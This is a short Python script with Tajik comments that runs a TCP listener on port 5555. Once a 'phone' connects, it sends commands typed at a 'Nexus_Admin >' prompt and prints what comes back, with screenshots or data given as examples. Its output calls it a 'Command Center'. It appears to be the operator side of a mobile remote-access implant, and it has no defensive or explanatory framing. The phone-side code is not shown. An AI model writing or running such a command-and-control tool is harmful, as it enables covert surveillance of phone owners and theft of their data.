import socket
import os

# Танзимоти сервер
HOST = '0.0.0.0'  # Ин маънои онро дорад, ки ҳамаи IP-ҳоро қабул мекунад
PORT = 5555       # Порти махсус барои алоқа

def start_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((HOST, PORT))
    server.listen(1)
    print(f"[*] Маркази Фармондеҳӣ фаъол шуд дар порти {PORT}...")
    print("[*] Мунтазири пайвастшавии телефон...")

    client_socket, addr = server.accept()
    print(f"[+] Телефон пайваст шуд! IP: {addr[0]}")

    while True:
        # Фармонҳое, ки ту ба телефон мефиристӣ
        command = input("Nexus_Admin > ")
        
        if command.lower() == 'exit':
            client_socket.close()
            break
            
        client_socket.send(command.encode())
        
        # Қабули ҷавоб (масалан, скриншот ё маълумот)
        response = client_socket.recv(1024).decode()
        print(f"[!] Ҷавоб аз телефон: {response}")

if __name__ == "__main__":
    start_server()